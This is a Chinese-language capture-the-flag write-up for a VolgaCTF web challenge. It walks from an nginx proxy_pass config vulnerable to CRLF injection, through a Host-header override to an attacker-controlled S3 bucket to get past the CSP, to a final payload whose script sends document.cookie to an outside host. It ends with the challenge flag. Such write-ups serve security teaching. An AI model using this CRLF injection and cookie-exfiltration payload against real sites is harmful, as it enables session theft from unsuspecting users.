# Static Site

個人覺得這題是 Web 裡面比較好玩的一題

首先題目給了 default (nginx.conf) 和 index.html

```
server {
    listen 443 ssl;
    resolver 8.8.8.8;
    server_name static-site.volgactf-task.ru;

    ssl_certificate      /etc/letsencrypt/live/volgactf-task.ru/fullchain1.pem;
    ssl_certificate_key  /etc/letsencrypt/live/volgactf-task.ru/privkey1.pem;

    add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-src https://www.google.com/recaptcha/; font-src https://fonts.gstatic.com/; style-src 'self' https://fonts.googleapis.com/; script-src 'self' https://www.google.com/recaptcha/api.js https://www.gstatic.com/recaptcha/" always;

    location / {
      root /var/www/html;
    }

    location /static/ {
      proxy_pass https://volga-static-site.s3.amazonaws.com$uri;
    }
}
```

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Static Site</title>
    <link rel="stylesheet" href="./static/bootstrap.min.css">
  </head>

  <body class="text-center">
    <div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
      <header class="mt-5">
          <h3 class="masthead-brand">Static Site</h3>
      </header>

      <main role="main" class="mt-5">
        <p class="lead"><img src="./static/hacker.gif"/></p>
        <p class="lead pt-5">
          Ok, hackers, I created a static site with a strict Content-Security-Policy.
        </p>
        <p class="lead">
          It is simply impossible to steal my cookies now!
        </p>
        <p class="lead">
          But, you can still try:
        </p>
        <p>
          <form id="form" class="form-inline justify-content-center" method="POST" action="https://bot-static-site.volgactf-task.ru/">
            <div class="form-group">
              <label for="url">URL</label>
              <input type="url" name="url" id="url" class="form-control mx-sm-3">
              <input type="submit" class="btn btn-secondary g-recaptcha" data-sitekey="6LdN230aAAAAAPsMXHWZ9szidC6tbkSzWDarMqmL" data-callback="onSubmit" data-action="submit">
            </div>
          </form>
        </p>
      </main>
    </div>
    <script src="https://www.google.com/recaptcha/api.js"></script>
    <script src="./static/captcha.js"></script>
  </body>
</html>
```

第一個漏洞在 nginx config 裡

```
location /static/ {
      proxy_pass https://volga-static-site.s3.amazonaws.com$uri;
}
 ```

這裡 `$uri` 其實可以帶 `\r`, `\n`

所以有 CRLF Injection 的問題

但目標是 XSS，所以單純 Request 的 CRLF Injection 還不夠，需要找地方控制 Response

由於該網站是架在 AWS S3 上的，所以其實下一步就是利用 CRLF Injection 把 `Host` header 蓋成我們自己的 S3 domain

然後我們就可以讓 Response 變成我們能控制的內容了!

大概是這種感覺:

```
https://static-site.volgactf-task.ru/static/index.html%20HTTP/1.1%0d%0aHost:kaibroxss2.s3.amazonaws.com%0d%0a%0d%0aa
```

接著，因為有 CSP 的關係，我們只能用 `<script src="xxxx"></script>` (self) 的方式來執行 javascript

只要用相同方式把 js file 傳到 s3 上，就能搞定 CSP 了

<br>

最後的 payload:

index.html:

```
<script src="/static/s.js%20HTTP/1.1%0d%0aHost:kaibroxss2.s3.amazonaws.com%0d%0a%0d%0aa"></script>
```

s.js:

```
document.location="https://kaibro.tw/"+document.cookie
```

=>

flag: `VolgaCTF{fc3ab39a7c258c8d15cc49d3aa34511b}`


